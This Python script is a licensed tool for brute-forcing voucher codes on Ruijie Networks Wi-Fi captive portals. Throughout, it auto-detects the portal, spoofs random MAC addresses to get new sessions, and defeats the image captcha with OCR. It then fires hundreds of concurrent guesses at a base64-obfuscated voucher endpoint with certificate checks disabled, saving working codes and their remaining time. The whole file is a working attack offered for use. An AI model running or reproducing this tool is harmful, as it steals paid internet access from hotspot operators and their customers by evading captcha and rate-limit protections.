#!/usr/bin/env python3
# Phyo_User.py - User Edition (License Required)
# Version: 10.2 - Fixed for Proot
# For Authorized Users Only

import asyncio
import aiohttp
import json
import base64
import random
import re
import os
import string
import time
import socket
import sys
import cv2
import ddddocr
import numpy as np
import urllib3
import requests
import hashlib
import getpass
from datetime import datetime

# ═══════════════════════════════════════════════════════════
# CONFIGURATION (MUST MATCH ADMIN)
# ═══════════════════════════════════════════════════════════
SECRET_KEY = "PhyoSuperSecretKey2024!@#$%^&*()"

CONCURRENCY = 800
BATCH_SIZE = 800
RESULT_FILE = os.path.expanduser("~/scan_results.txt")
LICENSE_FILE = os.path.expanduser("~/license.key")

_connector = None
_voucher_sem = None
_ocr = ddddocr.DdddOcr(show_ad=False)
stop_flag = False
found_codes = []
limited_codes = []
retry_total = 0
scan_start_time = None
portal_url = None
mode = "6"
speed = 800
current_code = "000000"
hits = 0
expired = 0
limits = 0
checked_total = 0
found_list = []
display_counter = 0

COLOR_RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BLUE = "\033[94m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# ═══════════════════════════════════════════════════════════
# LICENSE VERIFICATION (FIXED FOR PROOT)
# ═══════════════════════════════════════════════════════════

def get_device_id():
    """Unique Device ID (proot အတွက် အလုပ်လုပ်မယ်)"""
    try:
        username = getpass.getuser()
    except:
        username = os.getenv('USER') or os.getenv('LOGNAME') or 'unknown'
    raw = f"{username}{os.getuid()}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16]

def validate_license():
    """License Key ကို စစ်ဆေးတယ်"""
    device_id = get_device_id()
    
    if os.path.exists(LICENSE_FILE):
        with open(LICENSE_FILE, "r") as f:
            key = f.read().strip()
    else:
        print(f"\n{BOLD}{RED}⚠️ LICENSE NOT FOUND!{COLOR_RESET}")
        print(f"{BLUE}───────────────────────────────────────────{COLOR_RESET}")
        print(f"{BOLD}{YELLOW}📱 Your Device ID:{COLOR_RESET}")
        print(f"{BOLD}{GREEN}{device_id}{COLOR_RESET}")
        print(f"{BLUE}───────────────────────────────────────────{COLOR_RESET}")
        print(f"{CYAN}Please send this Device ID to Admin to get a License Key.{COLOR_RESET}")
        key = input(f"{BOLD}{YELLOW}Enter your License Key: {COLOR_RESET}").strip()
        
        if not key:
            print(f"{RED}❌ Invalid License Key{COLOR_RESET}")
            return False, None
        
        with open(LICENSE_FILE, "w") as f:
            f.write(key)
    
    try:
        decoded = base64.b64decode(key).decode()
        parts = decoded.split('|')
        
        if len(parts) != 3:
            raise ValueError("Invalid format")
        
        d_id, expiry_ts_str, signature = parts
        expiry_ts = int(expiry_ts_str)
        
        if d_id != device_id:
            print(f"{RED}❌ This license is for another device!{COLOR_RESET}")
            os.remove(LICENSE_FILE)
            return False, None
        
        expected_sig = hashlib.sha256(f"{d_id}|{expiry_ts}|{SECRET_KEY}".encode()).hexdigest()
        if signature != expected_sig:
            print(f"{RED}❌ Invalid License Signature (Tampered)!{COLOR_RESET}")
            os.remove(LICENSE_FILE)
            return False, None
        
        current_ts = int(time.time())
        if expiry_ts < current_ts:
            print(f"{RED}❌ Your license has EXPIRED!{COLOR_RESET}")
            print(f"{YELLOW}Please contact Admin for a new license.{COLOR_RESET}")
            os.remove(LICENSE_FILE)
            return False, None
        
        expiry_date = datetime.fromtimestamp(expiry_ts).strftime('%Y-%m-%d %H:%M:%S')
        remaining_seconds = expiry_ts - current_ts
        
        days = remaining_seconds // 86400
        hours = (remaining_seconds % 86400) // 3600
        minutes = (remaining_seconds % 3600) // 60
        
        if days > 0:
            remain_str = f"{days}d {hours}h {minutes}m"
        elif hours > 0:
            remain_str = f"{hours}h {minutes}m"
        else:
            remain_str = f"{minutes}m"
        
        print(f"\n{GREEN}✅ LICENSE VALID!{COLOR_RESET}")
        print(f"{BLUE}───────────────────────────────────────────{COLOR_RESET}")
        print(f"{BOLD}{CYAN}📅 Expires on : {expiry_date}{COLOR_RESET}")
        print(f"{BOLD}{GREEN}⏳ Remaining  : {remain_str}{COLOR_RESET}")
        print(f"{BLUE}───────────────────────────────────────────{COLOR_RESET}")
        time.sleep(2)
        
        return True, expiry_ts
        
    except Exception as e:
        print(f"{RED}❌ Invalid License Key format!{COLOR_RESET}")
        if os.path.exists(LICENSE_FILE):
            os.remove(LICENSE_FILE)
        return False, None
        # ═══════════════════════════════════════════════════════════
# LOGO & MENU
# ═══════════════════════════════════════════════════════════

def show_logo():
    logo = f"""
{BOLD}{BLUE}═══════════════════════════════════════════════════════{COLOR_RESET}
{BOLD}{GREEN}  PHYO - USER EDITION (LICENSED){COLOR_RESET}
{BOLD}{BLUE}  For Authorized Users Only{COLOR_RESET}
{BOLD}{BLUE}═══════════════════════════════════════════════════════{COLOR_RESET}
"""
    print(logo)

def show_menu():
    print(f"\n{BOLD}{BLUE}---{COLOR_RESET}")
    print(f"{BOLD}{GREEN}Phyo User Scanner{COLOR_RESET}")
    print(f"{BOLD}{BLUE}---{COLOR_RESET}")
    print(f"  {YELLOW}1.{COLOR_RESET} Auto-Catch Portal URL")
    print(f"  {YELLOW}2.{COLOR_RESET} Manual Enter Portal URL")
    print(f"  {YELLOW}3.{COLOR_RESET} Change Mode (current: {mode})")
    print(f"  {YELLOW}4.{COLOR_RESET} Start Scanner")
    print(f"  {YELLOW}5.{COLOR_RESET} View Results")
    print(f"  {YELLOW}6.{COLOR_RESET} Exit")
    print(f"{BLUE}---{COLOR_RESET}")
    # ═══════════════════════════════════════════════════════════
# PORTAL CATCHER
# ═══════════════════════════════════════════════════════════

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except:
        return "192.168.110.1"

def fetch_portal():
    print(f"\n{BLUE}[*] Finding portal...{COLOR_RESET}")
    gateways = [
        get_gateway_ip(),
        "192.168.110.1",
        "192.168.0.1",
        "192.168.1.1",
        "10.44.77.254",
        "10.0.0.1",
        "172.16.0.1"
    ]
    gateways = list(dict.fromkeys(gateways))
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        'Accept': '*/*'
    }
    portal_url = None

    for gw in gateways:
        target = f"http://{gw}"
        print(f"{CYAN}[*] Trying: {target}...{COLOR_RESET}")
        try:
            res = requests.get(target, headers=headers, timeout=3, allow_redirects=True)
            if "portal-as.ruijienetworks.com" in res.url:
                portal_url = res.url
                break
            match = re.search(r"href=['\"](.*?)['\"]", res.text)
            if match and "portal-as.ruijienetworks.com" in match.group(1):
                extracted = match.group(1)
                portal_url = extracted if extracted.startswith("http") else "https://portal-as.ruijienetworks.com" + extracted
                break
        except:
            pass

    if portal_url:
        api_url = portal_url.replace("/auth/wifidogAuth/login/?", "/api/auth/wifidog?stage=portal&")
        api_url = api_url.replace("/auth/wifidogAuth/login?", "/api/auth/wifidog?stage=portal&")
        print(f"\n{GREEN}[+] Portal URL captured!{COLOR_RESET}")
        print(f"{CYAN}    {api_url}{COLOR_RESET}")
        return api_url
    else:
        print(f"\n{RED}[-] Failed to capture portal URL{COLOR_RESET}")
        return None
        # ═══════════════════════════════════════════════════════════
# CODE GENERATOR
# ═══════════════════════════════════════════════════════════

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

_alnum = string.ascii_lowercase + string.digits
_alpha = string.ascii_lowercase

def all_generator(length=6):
    return "".join(random.choice(_alnum) for _ in range(length))

def ascii_generator(length=6):
    return "".join(random.choice(_alpha) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    while True:
        if mode == "ascii-lower":
            yield ascii_generator(6)
        elif mode == "all":
            yield all_generator(6)
        else:
            raise ValueError(f"Unknown mode: {mode}")
            # ═══════════════════════════════════════════════════════════
# NETWORK HELPERS
# ═══════════════════════════════════════════════════════════

def get_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0,255) for _ in range(5)]))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(sess, session_url, previous=None):
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'upgrade-insecure-requests': '1',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else previous
    except:
        return previous
        # ═══════════════════════════════════════════════════════════
# CAPTCHA HANDLER
# ═══════════════════════════════════════════════════════════

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode('.png', th)
    return _ocr.classification(buf.tobytes()).upper()

async def Captcha_Text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def Captcha_Image(sess, session_id):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params={'sessionId': session_id, '_t': str(time.time())},
        headers=h, ssl=False
    ) as r:
        return await r.read()

async def Verify_Captcha(sess, session_id, text):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=h, json={'sessionId': session_id, 'authCode': text}, ssl=False
    ) as r:
        d = await r.json()
        return session_id if d.get("success") is True else None
        # ═══════════════════════════════════════════════════════════
# BALANCE INFO
# ═══════════════════════════════════════════════════════════

async def Code_Expires_Date(session_id):
    h_macc2 = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    h_auth = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }
    endpoints = [
        (f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}', h_auth),
        (f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}', h_macc2),
    ]
    for url, headers in endpoints:
        try:
            async with aiohttp.ClientSession(
                connector=_connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=8)
            ) as s:
                async with s.get(url, headers=headers, ssl=False) as r:
                    data = await r.json()
                    res = data.get('result', {})
                    plan = res.get('profileName', 'Unknown')
                    remaining = res.get('remainingMinutes')
                    if remaining is not None:
                        remaining = int(remaining)
                        if remaining >= 0:
                            hh, mm = divmod(remaining, 60)
                            time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        else:
                            time_str = f"Expired ({remaining} mins)"
                        return f"Plan: {plan} | Time: {time_str}"
                    total = res.get('totalMinutes')
                    if total is not None:
                        hh, mm = divmod(int(total), 60)
                        time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        return f"Plan: {plan} | Time: {time_str}"
        except:
            continue
    return "Plan:Unknown | Time:Unknown"
    # ═══════════════════════════════════════════════════════════
# VOUCHER CHECK
# ═══════════════════════════════════════════════════════════

_post_url = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()

async def perform_check(session_url, code):
    global retry_total, current_code, hits, expired, limits, found_list
    current_code = code

    for attempt in range(2):
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=6)
        ) as sess:
            session_id = await get_session_id(sess, session_url)
            if not session_id:
                expired += 1
                return

            auth_code = None
            for _ in range(2):
                try:
                    img = await Captcha_Image(sess, session_id)
                    text = await Captcha_Text(img)
                    if not text:
                        continue
                    verified = await Verify_Captcha(sess, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except:
                    pass

            if not auth_code or stop_flag:
                expired += 1
                return

            payload = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
                              "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with sess.post(_post_url, json=payload, headers=headers, ssl=False) as r:
                    response = await r.text()
            except:
                expired += 1
                return

        if 'request limited' in response:
            retry_total += 1
            await asyncio.sleep(0.02)
            continue
        break
    else:
        expired += 1
        return

    if 'logonUrl' in response:
        info = await Code_Expires_Date(session_id)
        found_codes.append(f"{code} | {info}")
        found_list.append(f"{GREEN}✅ {code} | {info}{COLOR_RESET}")
        hits += 1
        with open(RESULT_FILE, "a", encoding="utf-8") as f:
            f.write(f"[HIT] {code} | {info}\n")
    elif 'STA' in response:
        info = await Code_Expires_Date(session_id)
        limited_codes.append(f"{code} | {info}")
        found_list.append(f"{YELLOW}⚠️ {code} | {info}{COLOR_RESET}")
        limits += 1
        with open(RESULT_FILE, "a", encoding="utf-8") as f:
            f.write(f"[LIMIT] {code} | {info}\n")
    else:
        expired += 1
        # ═══════════════════════════════════════════════════════════
# MAIN SCANNER RUNNER
# ═══════════════════════════════════════════════════════════

async def run_bruteforce(mode, session_url, speed):
    global _voucher_sem, stop_flag, scan_start_time, _connector, CONCURRENCY, BATCH_SIZE
    global hits, expired, limits, current_code, checked_total, found_list, display_counter

    CONCURRENCY = speed
    BATCH_SIZE = speed
    hits = 0
    expired = 0
    limits = 0
    checked_total = 0
    current_code = "000000"
    found_list = []
    found_codes.clear()
    limited_codes.clear()
    retry_total = 0
    display_counter = 0

    _connector = aiohttp.TCPConnector(limit=CONCURRENCY + 400, ssl=False)
    _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    stop_flag = False
    scan_start_time = time.monotonic()
    code_iter = iter_codes(mode)
    checked_total = 0

    show_logo()
    print(f"\n{BOLD}{BLUE}--- Configure Workers ---{COLOR_RESET}")
    print(f"{YELLOW}Enter number of workers (default {speed}): {COLOR_RESET}", end="")
    worker_input = input().strip()
    if worker_input.isdigit():
        speed = int(worker_input)
        CONCURRENCY = speed
        BATCH_SIZE = speed
    print(f"{GREEN}Scanner workers set to {CONCURRENCY}{COLOR_RESET}")

    try:
        while not stop_flag:
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with _voucher_sem:
                    return await perform_check(session_url, c)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked_total += len(batch)

            elapsed = time.monotonic() - scan_start_time
            speed_display = (checked_total / elapsed * 60) if elapsed > 0 else 0
            display_counter += 1

            if display_counter % 1 == 0:
                print("\033c", end="")
                show_logo()
                print(f"""
{BOLD}{BLUE}╔═══════════════════════════════════════════════════════════════╗{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {CYAN}▣ TRIED: {checked_total:,}{COLOR_RESET}                                      {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {YELLOW}◈ CURRENT CODE: {current_code}{COLOR_RESET}                             {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {BLUE}⚡ SPEED: {speed_display:.1f} c/s{COLOR_RESET}                                    {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {DIM}▶ PRESS Ctrl+C TO STOP{COLOR_RESET}                             {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}╠═══════════════════════════════════════════════════════════════╣{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {GREEN}● HITS    : {hits}{COLOR_RESET}                                       {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {RED}● EXPIRED : {expired}{COLOR_RESET}                                       {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}║{COLOR_RESET}  {YELLOW}● LIMITS  : {limits}{COLOR_RESET}                                       {BOLD}{BLUE}║{COLOR_RESET}
{BOLD}{BLUE}╚═══════════════════════════════════════════════════════════════╝{COLOR_RESET}""")
                if found_list:
                    recent = found_list[-5:] if len(found_list) > 5 else found_list
                    print("\n" + "\n".join(recent))

    except (asyncio.CancelledError, KeyboardInterrupt):
        stop_flag = True
    finally:
        if _connector:
            await _connector.close()

    elapsed = time.monotonic() - scan_start_time
    hh, rem = divmod(int(elapsed), 3600)
    mm, ss = divmod(rem, 60)

    print(f"\n\n{BOLD}{GREEN}{'='*55}{COLOR_RESET}")
    print(f"  {BOLD}{GREEN}Scan Complete{COLOR_RESET}")
    print(f"{BOLD}{GREEN}{'='*55}{COLOR_RESET}")
    print(f"  {BLUE}Time{COLOR_RESET}         : {BOLD}{hh}h {mm}m {ss}s{COLOR_RESET}")
    print(f"  {BLUE}Checked{COLOR_RESET}      : {BOLD}{checked_total:,}{COLOR_RESET}")
    print(f"  {BLUE}Hits{COLOR_RESET}         : {BOLD}{GREEN}{hits}{COLOR_RESET}")
    print(f"  {BLUE}Limits{COLOR_RESET}       : {BOLD}{YELLOW}{limits}{COLOR_RESET}")
    print(f"  {BLUE}Expired{COLOR_RESET}      : {BOLD}{RED}{expired}{COLOR_RESET}")
    print(f"  {BLUE}Retries{COLOR_RESET}      : {BOLD}{RED}{retry_total}{COLOR_RESET}")
    print(f"  {BLUE}Results{COLOR_RESET}      : {BOLD}{RESULT_FILE}{COLOR_RESET}")
    print(f"{BOLD}{GREEN}{'='*55}{COLOR_RESET}")
    if found_list:
        print(f"\n{GREEN}✅ ALL FOUND CODES:{COLOR_RESET}")
        for c in found_list:
            print(f"   {c}")
    print(f"\n{BLUE}───────────────────────────────────────────{COLOR_RESET}")
    input(f"{CYAN}[*] Press Enter to continue...{COLOR_RESET}")
    # ═══════════════════════════════════════════════════════════
# VIEW RESULTS
# ═══════════════════════════════════════════════════════════

def view_results():
    if os.path.exists(RESULT_FILE):
        print(f"\n{BOLD}{CYAN}Results from {RESULT_FILE}:{COLOR_RESET}\n")
        with open(RESULT_FILE, 'r', encoding='utf-8') as f:
            print(f.read())
    else:
        print(f"\n{RED}No results file found.{COLOR_RESET}")
        # ═══════════════════════════════════════════════════════════
# MAIN FUNCTION (LICENSE REQUIRED)
# ═══════════════════════════════════════════════════════════

async def main():
    global mode, portal_url, speed
    
    # ⭐ License ကို ပထမဆုံး စစ်တယ်
    print("\033c", end="")
    show_logo()
    valid, expiry_ts = validate_license()
    
    if not valid:
        print(f"\n{RED}❌ Access Denied. Please contact Admin for a valid license.{COLOR_RESET}")
        sys.exit(1)
    
    portal_url = None
    mode = "6"
    
    while True:
        show_menu()
        choice = input(f"{BOLD}{GREEN}Enter your choice:{COLOR_RESET} ").strip()
        
        if choice == "1":
            portal_url = fetch_portal()
            if not portal_url:
                print(f"{RED}❌ Portal not found. Please check Wi-Fi or use Option 2.{COLOR_RESET}")
        elif choice == "2":
            manual_url = input(f"{YELLOW}Enter Portal URL: {COLOR_RESET}").strip()
            if manual_url:
                portal_url = manual_url
                print(f"{GREEN}✅ Portal URL saved manually.{COLOR_RESET}")
            else:
                print(f"{RED}❌ Invalid URL.{COLOR_RESET}")
        elif choice == "3":
            mode = input(f"{YELLOW}Enter mode (6, 7, 8, ascii-lower, all): {COLOR_RESET}").strip()
            print(f"{GREEN}✅ Mode set to {mode}{COLOR_RESET}")
        elif choice == "4":
            if not portal_url:
                print(f"{RED}❌ No Portal URL found! Please choose Option 1 or 2 first.{COLOR_RESET}")
                continue
            await run_bruteforce(mode, portal_url, CONCURRENCY)
        elif choice == "5":
            view_results()
        elif choice == "6":
            print(f"{GREEN}Exiting...{COLOR_RESET}")
            break
        else:
            print(f"{RED}Invalid choice.{COLOR_RESET}")

if __name__ == "__main__":
    asyncio.run(main())
